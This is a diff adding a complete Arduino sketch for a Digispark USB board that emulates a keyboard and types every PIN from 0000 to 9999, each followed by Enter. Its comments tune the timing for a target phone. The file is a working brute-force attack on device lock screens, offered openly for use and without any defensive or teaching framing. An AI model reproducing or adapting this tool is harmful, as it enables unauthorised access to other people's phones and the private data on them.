@@ -1,0 +1,41 @@
+/*  Digispark 0000-9999 brute-forcer
+    MAXIMUM ACCURACY – one character at a time, long pauses
+    -------------------------------------------------------- */
+#include "DigiKeyboard.h"
+
+/* fine-tuned delays (ms) – raise them if your phone is slower */
+const byte CHAR_DELAY = 40;   // time between digits
+const byte ENTER_DELAY = 60;  // time after ENTER
+
+static void typeChar(char c)
+{
+  DigiKeyboard.print(c);        // single-character report
+  DigiKeyboard.delay(CHAR_DELAY);
+}
+
+static void sendCode(int num)
+{
+  typeChar('0' + (num / 1000) % 10);
+  typeChar('0' + (num / 100)  % 10);
+  typeChar('0' + (num / 10)   % 10);
+  typeChar('0' +  num         % 10);
+
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(ENTER_DELAY);
+}
+
+void setup()
+{
+  pinMode(1, OUTPUT);
+  digitalWrite(1, LOW);
+  DigiKeyboard.sendKeyStroke(0);     // release all
+}
+
+void loop()
+{
+  for (int num = 0; num <= 9999; ++num)
+    sendCode(num);
+
+  digitalWrite(1, HIGH);   // finished
+  for (;;) {}
+}
